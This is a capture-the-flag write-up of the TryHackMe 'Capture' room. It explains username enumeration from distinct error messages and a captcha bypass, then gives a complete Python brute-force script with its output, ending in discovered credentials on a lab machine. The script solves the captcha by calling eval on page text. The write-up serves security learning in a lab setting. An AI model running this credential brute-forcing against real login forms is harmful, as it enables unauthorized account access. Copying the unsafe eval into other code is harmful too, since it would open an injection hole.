---
title: TryHackMe - Capture
author: 0
date: 2023-05-10 16:00:00 +0800
categories: [thm, machine]
tags: [brute-force, username-enumeration, captcha-bypass, insufficient-anti-automation]
render_with_liquid: false
---

>SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly.

The application starts off with a homepage that includes just a simple login form. We got two downloadable files with a set of usernames and one file with a bunch of passwords.

![Homepage](/assets/img/thm-capture-homepage.png)

## Reconnaissance

When inputting credentials, we get a "User X not found" message which will allow us to enumerate existing users by going over the `usernames.txt` file and filtering out the requests that throw a different message than "User X not found".

![Username](/assets/img/thm-capture-username.png)

I started using burp intruder for this but after a few requests we need to fill in a captcha. This captcha is a simple calculation which is something we can solve by creating a python script.

![Captcha](/assets/img/thm-capture-captcha.png)

The python script makes a request to the login page, iterating over all usernames, solving the captcha if needed. Once it finds a username where the "User X not found" error isn't present, the script loops over all passwords.

```python
import requests
import sys
from bs4 import BeautifulSoup

headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
           "Content-Type":"application/x-www-form-urlencoded"}

def do_request(username, password):
    payload = f'username={username}&password={password}'
    response = requests.post(url + '/login', headers=headers, data=payload)
    
    # check if response needs a captcha to be solved
    soup = BeautifulSoup(response.text, 'html.parser')
    captcha_label = soup.find('label', text='Captcha enabled')
    if captcha_label:
        # Find captcha value on the page
        captcha_equation = captcha_label.find_next_sibling(text=True).strip()
        # Remove the last four characters " = ?"
        captcha_equation_stripped = captcha_equation[:-4]
        # Solve the captcha
        captcha_solved = eval(captcha_equation_stripped)
        # Set request payload to include solved captcha
        payload = payload + f'&captcha={captcha_solved}'
        response = requests.post(url + '/login', headers=headers, data=payload)
    return response

url = sys.argv[1]
count = 0

with open('usernames.txt') as usernames:
    for username in usernames:
        username = username.strip()
        response = do_request(username, 'password')
        count = count + 1
        username_exists = False
        # No error message so user exists
        if "does not exist" not in response.text:
            username_exists = True
            count_pw = 0
            with open('passwords.txt') as passwords:
                for password in passwords:
                    password = password.strip()
                    response = do_request(username, password)
                    count_pw = count_pw + 1
                    if "Invalid password" not in response.text:
                        print(f'CREDENTIALS FOUND: {username}:{password}')
                        sys.exit()
                    print(f'{count} - {username} - {response.status_code} - {username_exists} - {count_pw} - {password}')
        print(f'{count} - {username} - {response.status_code} - {username_exists}')

```

```bash
$ python3 exploit.py http://10.10.32.213
1 - rachel - 200 - False
2 - rodney - 200 - False
3 - corrine - 200 - False
4 - erik - 200 - False
5 - chuck - 200 - False
...
303 - dewitt - 200 - False
304 - hilario - 200 - False
305 - vilma - 200 - False
306 - hugh - 200 - False
307 - natalie - 200 - True - 1 - football
307 - natalie - 200 - True - 2 - kimberly
307 - natalie - 200 - True - 3 - mookie
307 - natalie - 200 - True - 4 - daniel
307 - natalie - 200 - True - 5 - love21
307 - natalie - 200 - True - 6 - drpepper
307 - natalie - 200 - True - 7 - brayan
307 - natalie - 200 - True - 8 - bullet
...
307 - natalie - 200 - True - 27 - arsenal
307 - natalie - 200 - True - 28 - pearljam
307 - natalie - 200 - True - 29 - fantasia
307 - natalie - 200 - True - 30 - angel2
CREDENTIALS FOUND: natalie:sk**REDACTED**rd
```